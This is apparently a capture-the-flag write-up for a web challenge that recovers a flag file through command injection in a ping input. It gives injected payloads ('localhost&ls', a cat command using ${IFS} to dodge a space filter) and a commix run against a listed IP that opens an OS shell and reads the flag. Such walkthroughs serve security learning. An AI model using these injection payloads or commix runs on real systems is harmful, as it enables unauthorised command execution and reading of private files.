
> [!NOTE] Problem
> read confidential file `/var/www/html/flag_xxxxx.txt` by using command injection

1. enter `localhost` for check if it ping `localhost` then add some syntax like `localhost&ls` from last command you will get flag name
2. get flag by using `localhost&cat${IFS}flagxxxx.txt`


## using commix

you can use commix for injection but you need to use burp suite for search how api is work

in this case 
```bash
commix --url="http://34.87.152.107" --data="127.0.0.1" --batch
```

after command is work you will get this
```bash
commix(os_shell) >ls
dist flag_MTZjY.txt index.nginx-debian.html index.php
cat flag_MTZjY.txt
web{vm8ncj66WG}
```